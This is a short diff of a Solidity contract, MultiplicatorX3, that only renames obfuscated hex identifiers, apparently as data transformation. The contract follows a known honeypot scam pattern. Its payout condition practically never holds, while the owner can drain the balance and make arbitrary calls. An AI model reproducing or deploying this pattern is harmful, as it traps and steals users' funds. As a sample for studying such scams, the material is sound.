@@ -6,7 +6,7 @@ contract MultiplicatorX3
 
     function() public payable{}
 
-    function _0xc0e129()
+    function _0x133caa()
     payable
     public
     {
@@ -14,21 +14,21 @@ contract MultiplicatorX3
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0xe40923,bytes data)
+    function Command(address _0x168223,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0xe40923.call.value(msg.value)(data);
+        _0x168223.call.value(msg.value)(data);
     }
 
-    function _0xe926cb(address _0xe40923)
+    function _0x185f69(address _0x168223)
     public
     payable
     {
         if(msg.value>=this.balance)
         {
-            _0xe40923.transfer(this.balance+msg.value);
+            _0x168223.transfer(this.balance+msg.value);
         }
     }
 }
